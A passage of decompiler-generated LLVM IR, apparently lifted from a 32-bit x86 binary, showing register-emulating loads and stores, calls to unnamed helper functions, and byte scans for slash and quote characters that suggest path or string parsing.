  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_80554f3.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_80554fa.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_80526d0()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_8053123(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1195 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1195, i32* %ecx.global-to-local, align 4
  %v2_8049ed4196 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4197 = inttoptr i32 %v2_8049ed4196 to i32*
  store i32 1, i32* %v3_8049ed4197, align 4
  %v0_8049edb198 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb199 = inttoptr i32 %v0_8049edb198 to i8*
  %v2_8049edb200 = load i8, i8* %v1_8049edb199, align 1
  %v3_8049edb201 = zext i8 %v2_8049edb200 to i32
  %v4_8049edb202 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb203 = and i32 %v4_8049edb202, -256
  %v6_8049edb204 = or i32 %v5_8049edb203, %v3_8049edb201
  store i32 %v6_8049edb204, i32* %edx.global-to-local, align 4
  %v4_8049edd205 = icmp eq i8 %v2_8049edb200, 0
  store i1 %v4_8049edd205, i1* %zf.global-to-local, align 1
  %v1_8049edf206 = icmp eq i1 %v4_8049edd205, false
  br i1 %v1_8049edf206, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb208 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049edb207 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb198, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb208, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_8051cd0(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_8051c20(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8052640(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8051c50(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8052640(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
  store i32 %v3_8049f96, i32* %eax.global-to-local, align 4
  %v2_8049f9a = add i32 %v0_8049f82, 40
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v1_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049f9e = load i32, i32* @esp, align 4
  %v1_8049f9e = add i32 %v0_8049f9e, 48
